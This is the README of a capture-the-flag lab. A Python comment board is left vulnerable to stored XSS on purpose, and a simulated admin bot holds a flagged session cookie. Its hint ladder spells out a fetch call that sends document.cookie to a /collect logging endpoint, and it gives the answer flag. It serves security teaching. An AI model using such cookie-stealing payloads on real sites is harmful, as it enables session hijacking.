# Stored XSS Comment Board

Author: Gavin Blacklock

## Objective

A comment board stores whatever visitors post and prints it back for
everyone, including the admin. Nothing is cleaned up on the way in or
on the way out. Get a comment stored that runs script in the admin
context, have it send the admin session cookie to a collector you
control, and read the flag out of the cookie.

Flag format: `SALVO{...}`, and here the flag is the value inside the
admin session cookie.

## Files

- `app.py`: the board. A tiny app in pure Python 3.12 standard
  library, using `http.server` only. It serves the board at `/`, stores
  posts from `/comment`, renders every comment raw on `/admin`, and
  has a `/collect` endpoint that appends whatever it receives to a
  stolen data log at `/var/tmp/stolen.txt`.
- `bot.js`: a Node script that plays the admin. Read the section below
  before you judge it, it is a simulation harness, not a real browser.
- `WRITEUP.md`: my full walkthrough, with the real commands I ran and
  the real output they produced.

## About the Bot

The bot is a local simulation harness standing in for a real admin
browser. A real stored XSS attack needs a victim, usually an admin,
to open the poisoned page while logged in. This lab has no real admin
and uses no real browser, so `bot.js` stands in for both:

1. It fetches `http://127.0.0.1:8002/admin` with a `Cookie` header
   carrying `session=SALVO{st0r3d_xss_g0t_th3_c00k13}`.
2. It extracts every script block from the rendered page.
3. It runs those blocks in a Node `vm` sandbox where `document.cookie`
   returns that cookie and `fetch` really performs HTTP requests.

That is enough for a stored payload to read the cookie and send it to
`/collect`, exactly as it would in a browser. The bot only ever talks
to the lab on localhost.

## Setup

You need Python 3.12, Node, and curl. Nothing to install for the app,
it uses only the standard library.

Start the app in one terminal:

```bash
cd labs/web/xss-comment-board
python3 app.py
```

You should see:

```text
Listening on http://127.0.0.1:8002
```

The app runs on port **8002**. Comments are stored in memory, so
restarting the app clears the board. The stolen data log lives at
`/var/tmp/stolen.txt`, scratch stays in `/var/tmp` in this lab set.
Delete that file before a fresh run if you want a clean result.

## The Task

1. Post a normal comment and confirm the board stores and prints it.
2. Post a script payload and look at how it comes back on the board.
3. Think about who else reads this board, and what they carry with
   them when they visit.
4. Post a payload that sends `document.cookie` to `/collect`.
5. Run the admin bot with `node bot.js`.
6. Read `/var/tmp/stolen.txt` and copy the flag out of the cookie.

Run this only against this lab on your own machine.

## Hint Ladder

Hint 1, a nudge: View the page source after posting a comment with
HTML in it. The board does not escape anything. Your markup is not
shown as text, it becomes part of the page.

Hint 2, more direct: A stored `<script>` block runs when someone
loads a page that prints it. A plain `alert(1)` proves the idea in a
real browser, but it sends nothing anywhere, so on its own it steals
nothing and leaves no trace on the server.

Hint 3, nearly the answer: The admin page at `/admin` prints the same
comments, and the admin arrives holding a session cookie. Script on
that page can read `document.cookie` and call
`fetch('http://127.0.0.1:8002/collect?c=' + document.cookie)`. Whatever
that request carries lands in the stolen data log.

## What a Good Run Looks Like

Before the bot visits, `/var/tmp/stolen.txt` does not exist. After
`node bot.js` visits `/admin`, the log contains one line with the
admin cookie in it, flag and all.
